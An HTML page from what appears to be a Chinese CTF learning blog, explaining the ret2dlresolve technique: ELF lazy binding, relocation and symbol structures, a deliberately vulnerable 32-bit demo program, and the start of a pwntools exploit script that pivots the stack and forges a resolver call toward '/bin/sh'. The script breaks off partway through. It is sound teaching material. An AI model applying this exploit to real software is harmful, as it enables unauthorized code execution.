@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="简介ret2dlresolve 是一种利用程序漏洞（通常是缓冲区溢出）来绕过程序的安全机制并控制程序流程的攻击方式。它利用了动态链接库 （DLL）解析的过程，攻击者通过修改程序的控制流，迫使程序调用恶意的共享库函数。具体来说，攻击者通过构造特定的输入，使得程 序在执行时调用一个由攻击者控制的函数，从而实现远程代码执行。该攻击通常针对未启用安全防护（如地址空间布局随机化 ASLR 或栈 保护）的程序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dlresolve">
+<meta property="og:url" content="http://linkpwn.github.io/2025/11/02/ret2dlresolve/index.html">
+<meta property="og:site_name" content="网络幻影">
+<meta property="og:description" content="简介ret2dlresolve 是一种利用程序漏洞（通常是缓冲区溢出）来绕过程序的安全机制并控制程序流程的攻击方式。它利用了动态链接库 （DLL）解析的过程，攻击者通过修改程序的控制流，迫使程序调用恶意的共享库函数。具体来说，攻击者通过构造特定的输入，使得程 序在执行时调用一个由攻击者控制的函数，从而实现远程代码执行。该攻击通常针对未启用安全防护（如地址空间布局随机化 ASLR 或栈 保护）的程序">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://linkpwn.github.io/2025/11/02/ret2dlresolve/8.png">
+<meta property="article:published_time" content="2025-11-02T05:13:44.000Z">
+<meta property="article:modified_time" content="2026-02-19T16:52:33.460Z">
+<meta property="article:author" content="linkpwn">
+<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://linkpwn.github.io/2025/11/02/ret2dlresolve/8.png">
+
+<link rel="canonical" href="http://linkpwn.github.io/2025/11/02/ret2dlresolve/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ret2dlresolve | 网络幻影</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">网络幻影</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <a>
+        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/11/02/ret2dlresolve/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2dlresolve
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-11-02 13:13:44" itemprop="dateCreated datePublished" datetime="2025-11-02T13:13:44+08:00">2025-11-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-02-20 00:52:33" itemprop="dateModified" datetime="2026-02-20T00:52:33+08:00">2026-02-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/ret2dlresolve/" itemprop="url" rel="index"><span itemprop="name">ret2dlresolve</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ret2dlresolve 是一种利用程序漏洞（通常是缓冲区溢出）来绕过程序的安全机制并控制程序流程的攻击方式。它利用了动态链接库</p>
+<p>（DLL）解析的过程，攻击者通过修改程序的控制流，迫使程序调用恶意的共享库函数。具体来说，攻击者通过构造特定的输入，使得程</p>
+<p>序在执行时调用一个由攻击者控制的函数，从而实现远程代码执行。该攻击通常针对未启用安全防护（如地址空间布局随机化 ASLR 或栈</p>
+<p>保护）的程序。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="ELF的动态解析"><a href="#ELF的动态解析" class="headerlink" title="ELF的动态解析"></a>ELF的动态解析</h3><p>编译时，例如write,puts,printf等函数在 libc，但是libc 地址未知，程序不能直接 call write，只能：call write@plt，运行时再解析。</p>
+<h3 id="GOT-和-PLT-机制"><a href="#GOT-和-PLT-机制" class="headerlink" title="GOT 和 PLT 机制"></a>GOT 和 PLT 机制</h3><h4 id="PLT表（函数跳板）"><a href="#PLT表（函数跳板）" class="headerlink" title="PLT表（函数跳板）"></a>PLT表（函数跳板）</h4><p>plt里每个函数长这样</p>
+<p><img src="/2025/11/02/ret2dlresolve/8.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts@plt:</span><br><span class="line">    jmp [puts@got]</span><br><span class="line">    push reloc_index</span><br><span class="line">    jmp plt0</span><br></pre></td></tr></table></figure>
+
+<p>第一次调用时puts是没有解析完的所以[puts@got]里面没有puts的libc的地址，因此他会继续向下执行。</p>
+<p>所以执行流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">write@plt</span><br><span class="line"> ↓</span><br><span class="line">plt0</span><br><span class="line"> ↓</span><br><span class="line">_dl_runtime_resolve</span><br></pre></td></tr></table></figure>
+
+<p>解析后:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write@got = libc_write</span><br></pre></td></tr></table></figure>
+
+<p>以后再调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write@plt → jmp write@got → libc_write</span><br></pre></td></tr></table></figure>
+
+<h4 id="GOT表"><a href="#GOT表" class="headerlink" title="GOT表"></a>GOT表</h4><p>第一次调用前：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write@got = plt0</span><br></pre></td></tr></table></figure>
+
+<p>第一次解析后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write@got = libc_write</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="真正负责解析的函数-dl-runtime-resolve"><a href="#真正负责解析的函数-dl-runtime-resolve" class="headerlink" title="真正负责解析的函数_dl_runtime_resolve"></a>真正负责解析的函数_dl_runtime_resolve</h3><p>在之前我提到了一个plt0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt0:</span><br><span class="line">    push link_map</span><br><span class="line">    jmp _dl_runtime_resolve</span><br></pre></td></tr></table></figure>
+
+<p>替换掉的话执行流就变成了这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push link_map</span><br><span class="line">push reloc_index</span><br><span class="line">jmp _dl_runtime_resolve</span><br></pre></td></tr></table></figure>
+
+<p>所以进入 _dl_runtime_resolve时栈的情况是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">return addr （返回write@plt下一条）   //低地址</span><br><span class="line">reloc_index</span><br><span class="line">link_map                             //高地址</span><br></pre></td></tr></table></figure>
+
+<h3 id="resolver第一件事：拿-reloc-index"><a href="#resolver第一件事：拿-reloc-index" class="headerlink" title="resolver第一件事：拿 reloc_index"></a>resolver第一件事：拿 reloc_index</h3><p>伪代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reloc = JMPREL + reloc_index</span><br></pre></td></tr></table></figure>
+
+<p>JMPREL：.rel.plt 表地址。</p>
+<p>.rel.plt 表，每个表项8字节：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Rel</span><br><span class="line">&#123;</span><br><span class="line">    r_offset</span><br><span class="line">    r_info</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rel = rel_plt + reloc_index</span><br></pre></td></tr></table></figure>
+
+<p>现在 resolver 得到：rel 指向某个重定位项。</p>
+<h3 id="取-r-offset-和-r-info"><a href="#取-r-offset-和-r-info" class="headerlink" title="取 r_offset 和 r_info"></a>取 r_offset 和 r_info</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_offset = rel-&gt;r_offset</span><br><span class="line">r_info   = rel-&gt;r_info</span><br></pre></td></tr></table></figure>
+
+<p>含义：</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>r_offset</td>
+<td>解析后写入的地址（GOT）</td>
+</tr>
+<tr>
+<td>r_info</td>
+<td>决定解析哪个符号</td>
+</tr>
+</tbody></table>
+<h3 id="检查-r-info-类型"><a href="#检查-r-info-类型" class="headerlink" title="检查 r_info 类型"></a>检查 r_info 类型</h3><p>resolver做校验：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type = r_info &amp; 0xff</span><br></pre></td></tr></table></figure>
+
+<p>必须：type &#x3D;&#x3D; 7   (R_386_JUMP_SLOT) 否则：直接崩</p>
+<h3 id="通过-r-info-找-dynsym"><a href="#通过-r-info-找-dynsym" class="headerlink" title="通过 r_info 找 dynsym"></a>通过 r_info 找 dynsym</h3><p>核心公式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sym_index = r_info &gt;&gt; 8</span><br><span class="line">sym = dynsym + sym_index * 16</span><br></pre></td></tr></table></figure>
+
+<p>因为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Sym结构大小 = 16字节</span><br></pre></td></tr></table></figure>
+
+<p>此时 resolver 认为：sym 是要解析的符号</p>
+<h3 id="dynsym结构"><a href="#dynsym结构" class="headerlink" title="dynsym结构"></a>dynsym结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Sym</span><br><span class="line">&#123;</span><br><span class="line">    st_name   ← 最关键</span><br><span class="line">    st_value</span><br><span class="line">    st_size</span><br><span class="line">    st_info</span><br><span class="line">    st_other</span><br><span class="line">    st_shndx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>resolver接下来只关心：st_name</p>
+<h3 id="通过-st-name-找字符串"><a href="#通过-st-name-找字符串" class="headerlink" title="通过 st_name 找字符串"></a>通过 st_name 找字符串</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = strtab + sym-&gt;st_name</span><br></pre></td></tr></table></figure>
+
+<p>strtab：.dynstr字符串表起始地址</p>
+<p>name &#x3D; 函数名字符串,例如：”write”,”system”,”read”</p>
+<p>查找到函数名，它就会把这个函数的libc的地址写入got表并执行。</p>
+<h3 id="这里补充一下link-map的作用"><a href="#这里补充一下link-map的作用" class="headerlink" title="这里补充一下link_map的作用"></a><strong>这里补充一下link_map的作用</strong></h3><h4 id="link-map结构本质"><a href="#link-map结构本质" class="headerlink" title="link_map结构本质"></a>link_map结构本质</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Addr l_addr;      <span class="comment">// 模块加载基址</span></span><br><span class="line">    <span class="type">char</span> *l_name;           <span class="comment">// so名字</span></span><br><span class="line">    Elf32_Dyn *l_ld;        <span class="comment">// 动态段</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line"></span><br><span class="line">    Elf32_Addr l_info[];    <span class="comment">// ⭐最关键</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>我们只需要关心：l_info[里存什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l_info[DT_STRTAB] → 字符串表地址</span><br><span class="line">l_info[DT_SYMTAB] → 符号表地址</span><br><span class="line">l_info[DT_JMPREL] → 重定位表地址</span><br><span class="line">l_info[DT_PLTGOT] → GOT地址</span><br></pre></td></tr></table></figure>
+
+<p>resolver内部逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">symtab = link_map-&gt;l_info[DT_SYMTAB]</span><br><span class="line">strtab = link_map-&gt;l_info[DT_STRTAB]</span><br><span class="line">jmprel = link_map-&gt;l_info[DT_JMPREL]</span><br></pre></td></tr></table></figure>
+
+<p>这个了解一下就行，感觉只要知道link_map是必不可少的就行。</p>
+<h2 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h2><p>这个攻击手法，就是通过伪造前置基础介绍的这个流程中的一些信息，是的原本要执行puts，write等函数时，会执行到system。</p>
+<p>通过具体的例子来一步一步详细讲解是怎么利用的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;ret2dlresolve\n&quot;</span>;</span><br><span class="line">	write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc reslove.c -m32 -fno-stack-protector -no-pie -O0 -o resolve</span></span><br></pre></td></tr></table></figure>
+
+<p>伪代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">112</span>]; <span class="comment">// [esp+0h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(s, <span class="string">&quot;ret2dlresolve\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s[<span class="number">15</span>], <span class="number">0</span>, <span class="number">85</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  write(<span class="number">1</span>, s, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>我们先解析wirte函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">► 0x80490b0  &lt;write@plt&gt;                endbr32</span><br><span class="line">  0x80490b4  &lt;write@plt+4&gt;              jmp    dword ptr [0x804c018] &lt;0x8049070&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x8049070                             endbr32</span><br><span class="line">  0x8049074                             push   0x18</span><br><span class="line">  0x8049079                             jmp    0x8049030 &lt;0x8049030&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x8049030                             push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804c004&gt;</span><br><span class="line">  0x8049036                             jmp    dword ptr [0x804c008] &lt;_dl_runtime_resolve&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0xf7fd8ff0 &lt;_dl_runtime_resolve&gt;      endbr32</span><br><span class="line">  0xf7fd8ff4 &lt;_dl_runtime_resolve+4&gt;    push   eax</span><br><span class="line">  0xf7fd8ff5 &lt;_dl_runtime_resolve+5&gt;    push   ecx</span><br><span class="line">  0xf7fd8ff6 &lt;_dl_runtime_resolve+6&gt;    push   edx</span><br></pre></td></tr></table></figure>
+
+<p>pwndbg一下可以看到write的index_offset是0x18</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08049301</span> <span class="comment"># ROPgadget --binary bof --only &quot;pop|ret&quot;</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08049303</span></span><br><span class="line">leave_ret = <span class="number">0x08049145</span> <span class="comment"># ROPgadget --binary bof --only &quot;leave|ret&quot;</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804c024</span> <span class="comment"># readelf -S bof | grep &quot;.bss&quot;</span></span><br><span class="line">bss_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;ret2dlresolve\n&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;A&#x27;</span> * offset    <span class="comment">#栈迁移</span></span><br><span class="line">, p32(read_plt)</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">0</span>)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(<span class="number">100</span>)</span><br><span class="line">, p32(pop_ebp_ret)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(leave_ret))</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x8049030</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">index_offset = <span class="number">0x18</span><span class="comment"># write&#x27;s index</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">, p32(plt_0) <span class="comment"># push link_map;jmp dl_runtime_resolve</span></span><br><span class="line">, index_offset <span class="comment"># 这里对应的就是 push 18h</span></span><br><span class="line">, <span class="string">&#x27;aaaa&#x27;</span>    